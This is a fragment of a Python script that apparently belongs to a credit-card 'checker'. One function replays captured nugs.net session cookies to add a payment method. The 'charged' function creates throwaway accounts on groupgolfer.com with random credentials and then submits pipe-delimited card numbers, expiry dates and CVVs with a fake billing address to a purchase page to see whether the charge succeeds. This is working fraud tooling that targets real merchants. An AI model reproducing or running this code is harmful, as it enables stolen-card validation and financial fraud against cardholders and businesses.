DLMJNdUVDT2jEYbLQrd7CrLHzaPhl0yl5NvAvVoHzIHlFpHkTGpKjpcin%2F8XOqMn3lom4L4juA2mTrG0u8HpS2ke3G7oMJpDg0wylq%2FdtIv%2F%2Fs7960eflXnF7WjOOnh%2BHb7XZP0g7Zx5U4W121pioQWpDXvZozZIwyDAJ9Z9SUWxFb1sOcP9tYJS2xefO94XACzV0fWRE4ckSxffrXUaDv6urwyzOWvS2iZsHe%2BQbghbyEX7LCNcwhTsNztyN2b6CTX013QkpJu0Ut6w6idpmO4xZNHFbdNg951tUm5ikYirr4GFkxu0AdsigRJQ1C%2FQyoy423QQrZh%2B3Pf8w0zwEl17dpsmvYlrK0t7JPDUNlhsHCHulu0OvXJJDYqknlqicXMlvQKBMURUpePaGk%2FKBrE%2BcjW7Inz0fhjlMVvRmZw8EjsvsNlbpKNqhl4MJoVN3uB6pv5mzFgucISesKWNe2Nl3RDFJhp%2BtvXxW5r0s0CRgpzxLenTge90DBHCpvFULi6EOUdeE47twg9qHowOfoIiHyo0yD1m0ApxMQgCeX9xdkB%2FO3crpqA316XpwMGyWDzFX8%2FFop6LLw9VqbFsgDJQzNwYkq494LCCJ8Iq0ihG%2FRYqDfJ7KqvcU8P63eBsHMkEvsHqIaG5wtxDg0srFlDyt5Ub2pt8QuTqcv82%2BTvHwnOwfLIYRgZKThoUit3ICtwwg2vstvqQYMynAlNWgvd9X%2B9pszn9qkNpS%2FDTT6I6BvYNu8hxbUJFULmal9WjgQC%2BKqsWXZmHndXcsd6rtWwkKdUQJ8D3dpJBz365zV%2BKBHqWrITo6PyZjG70GkCsmRB1%2FN9YfXFOlCWaeB84%2Fs7JBNVhD%2BPCI6LPjNtZbl3PoD2UYTwDXRkPIb6DOxjU9CtHe3eN14sGl8hEsPvdnwni7srp%2FuMQ3Qco6W0F9OOkv8Ss8DYa5b%2BmufVXaEcyABK24R5%2FKO6Gcxt6j0zt9eFnSWjdimhVDRNEL6MG1Lm8sIvCMgP8zmr66GItOM5NNuOKiK8%2Fkz8S4r4nzoSF4FnuOUd%2BTQqdzX7ClInyxrOATvaO6NKNTqcGLkdAeMnzme5TKz%2BNdrvgRL6c%2Bsa9%2BB5yRl8lTRnHNBPpbvUg9PM2AX6BIRyS4hhoooBTBrVaUd2KXn9aeluZ62x2QLhO61VZ7cUinPXG8Q0k66zi6B8%2B92uRLBnzsbAKnN3h4UEocJr7jIhXH3EYQiyel1uj0cCAQ%2B1u8C99sXonenq5%2BFe6HzcSuiZ60OLaYdR%2FhvpUw4GHnOa7JOrjUKIY%2FIcm%2BCVrXKlOKGIqTlyILYo1KFlzPH8VUIvHSAS6Ad%2FwptIMRjyqOz0yB8DKorf4lMUx%2B9JiX4NwzOQZadORJNLeXFD0H1eR3xODpld1WHuz98ucmKr%2Fq7ba0Yg%3D%3BY6USKesXJ%2Bobw74B1qS5Rg%3D%3D%3B0d3aIA3ygCKAaw2x; __stripe_sid=9e3213f1-7220-413a-be6c-e49bdceb41a7851eb5; _ga_SVB3VG3YGK=GS1.1.1723182627.2.1.1723182641.46.0.0',
        'Origin': 'https://account.nugs.net',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'paymentMethodId': id,
    }

    response = requests.post('https://account.nugs.net/api/v1/me/payment-methods', cookies=cookies, headers=headers, json=json_data)
    return response.status_code
def charged(ccard):
    card=ccard.split("|")
    cardNumber = card[0]
    cardMonth = card[1]
    cardYear = card[2]
    if len(cardYear) == 2:
        cardYear = "20"+cardYear
    cardCc= card[3]
    url = "https://www.groupgolfer.com/account/signup.php"

    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    email =f"{''.join(random.choices(string.ascii_lowercase, k = 7))}@{''.join(random.choices(string.ascii_lowercase, k = 5))}.com"
    password=''.join(random.choices(string.ascii_lowercase, k = 8))
    data = f"name={''.join(random.choices(string.ascii_lowercase, k = 2))} {''.join(random.choices(string.ascii_lowercase, k = 5))} khan&email={email}&email_confirm={email}&password={password}&password_confirm={password}&city_id=13&postal_code=84728&signup="
    resp = requests.post(url, headers=headers, data=data,allow_redirects=False)

    for cookie in resp.headers["Set-Cookie"].split():
        if "PHPSESSID" in cookie:
            cookies =cookie
    url = "https://www.groupgolfer.com/deals/buy.php?id=1022978"

    headers = CaseInsensitiveDict()
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    headers["cookie"] = cookies
    headers["Host"] = "www.groupgolfer.com"
    headers["Origin"] = "https://www.groupgolfer.com"

    data = f"order_quantity=1&billing_card_name=Michi Mao&billing_card_number={cardNumber}&billing_cvv2={cardCc}&billing_exp_month={cardMonth}&billing_exp_year={cardYear}&billing_address1=7626 Nestor Hollow&billing_address2=&billing_city=Allisonview&billing_region=NC&billing_postal_code=84728&submit=&gift_name=&gift_email="


    resp1 = requests.post(url, headers=headers, data=data)
    soup = BeautifulSoup(resp1.text, 'html.parser')
    script_blocks = soup.find_all('div', {'class': 'notification'})
    if len(script_blocks) == 2:
        res = script_blocks[1]
    else:
        res = script_blocks[0]
    return res